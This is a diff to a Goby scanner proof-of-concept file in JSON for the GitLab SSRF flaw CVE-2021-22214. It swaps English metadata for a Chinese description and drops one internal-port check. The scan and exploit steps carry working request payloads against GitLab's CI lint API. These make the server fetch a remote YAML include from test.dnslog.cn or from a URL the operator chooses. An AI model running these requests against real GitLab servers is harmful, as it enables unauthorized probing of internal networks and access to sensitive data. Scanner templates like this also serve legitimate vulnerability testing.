@@ -1,35 +1,26 @@
 {
       "Name": "GitLab SSRF CVE-2021-22214",
       "Level": "3",
-      "Tags": [
-            "SSRF"
-      ],
+      "Tags": [],
       "GobyQuery": "app=\"GitLab\"",
-      "Description": "GitLab is The DevOps Platform.",
-      "Product": "GitLab",
-      "Homepage": "https://about.gitlab.com/",
-      "Author": "",
-      "Impact": "When requests to the internal network for webhooks are enabled, a server-side request forgery vulnerability in GitLab CE/EE affecting all versions starting from 10.5 was possible to exploit for an unauthenticated attacker even on a GitLab instance where registration is limited.",
-      "Recommendation": "",
+      "Description": "GitLab存在前台未授权SSRF漏洞，未授权的攻击者也可以利用该漏洞执行SSRF攻击（CVE-2021-22214）。该漏洞源于对用户提供数据的验证不足，远程攻击者可通过发送特殊构造的 HTTP 请求，欺骗应用程序向任意系统发起请求。攻击者成功利用该漏洞可获得敏感数据的访问权限或向其他服务器发送恶意请求。",
+      "Product": "Gitlab > 10.5",
+      "Homepage": "https://gobies.org/",
+      "Author": "luckying",
+      "Impact": "",
+      "Recommandation": "",
       "References": [
-            "https://nvd.nist.gov/vuln/detail/CVE-2021-22214",
-            "https://nvd.nist.gov/vuln/detail/CVE-2021-39935",
-            "https://nvd.nist.gov/vuln/detail/CVE-2021-22175",
-            "https://vin01.github.io/piptagole/gitlab/ssrf/security/2021/06/15/gitlab-ssrf.html",
-            "https://docs.gitlab.com/ee/api/lint.html"
+            "https://gobies.org/"
       ],
-      "HasExp": true,
-      "ExpParams": [
-            {
-                  "Name": "URL",
-                  "Type": "input",
-                  "Value": "test.dnslog.cn"
-            }
-      ],
-      "ExpTips": {
-            "Type": "",
-            "Content": ""
-      },
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "URL",
+			"type": "input",
+			"value": "test.dnslog.cn",
+			"show": ""
+		}
+	  ],
       "ScanSteps": [
             "AND",
             {
@@ -39,7 +30,8 @@
                         "follow_redirect": false,
                         "header": {
                               "Content-Type": "application/json",
-                              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
+                              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                              "Content-Length": ""
                         },
                         "data_type": "text",
                         "data": "{\"include_merged_yaml\":true,\"content\":\"include:\\n  remote: http://test.dnslog.cn/api/v1/targets?test.yml\",\"wglt1cskpv\":\"=\"}"
@@ -65,45 +57,9 @@
                         ]
                   },
                   "SetVariable": []
-            },
-            {
-                  "Request": {
-                        "method": "POST",
-                        "uri": "/api/v4/ci/lint?include_merged_yaml=true",
-                        "follow_redirect": true,
-                        "header": {
-                              "Content-Type": "application/json"
-                        },
-                        "data_type": "text",
-                        "data": "{\"content\": \"include:\\n  remote: http://127.0.0.1:9100/test.yml\"}",
-                        "set_variable": []
-                  },
-                  "ResponseTest": {
-                        "type": "group",
-                        "operation": "AND",
-                        "checks": [
-                              {
-                                    "type": "item",
-                                    "variable": "$code",
-                                    "operation": "==",
-                                    "value": "200",
-                                    "bz": ""
-                              },
-                              {
-                                    "type": "item",
-                                    "variable": "$body",
-                                    "operation": "contains",
-                                    "value": "does not have valid YAML syntax",
-                                    "bz": ""
-                              }
-                        ]
-                  },
-                  "SetVariable": [
-                        "output|lastbody|regex|"
-                  ]
             }
       ],
-      "ExploitSteps": [
+	  "ExploitSteps": [
             "AND",
             {
                   "Request": {
@@ -112,7 +68,8 @@
                         "follow_redirect": false,
                         "header": {
                               "Content-Type": "application/json",
-                              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
+                              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                              "Content-Length": ""
                         },
                         "data_type": "text",
                         "data": "{\"include_merged_yaml\":true,\"content\":\"include:\\n  remote: http://{{{URL}}}/api/v1/targets?test.yml\",\"wglt1cskpv\":\"=\"}"
@@ -138,10 +95,10 @@
                         ]
                   },
                   "SetVariable": [
-                        "output|lastbody|undefined|undefined"
-                  ]
+					"output|lastbody"
+				  ]
             }
       ],
-      "PostTime": "0000-00-00 00:00:00",
-      "GobyVersion": "0.0.0"
+      "PostTime": "2021-07-01 20:34:22",
+      "GobyVersion": "1.8.268"
 }
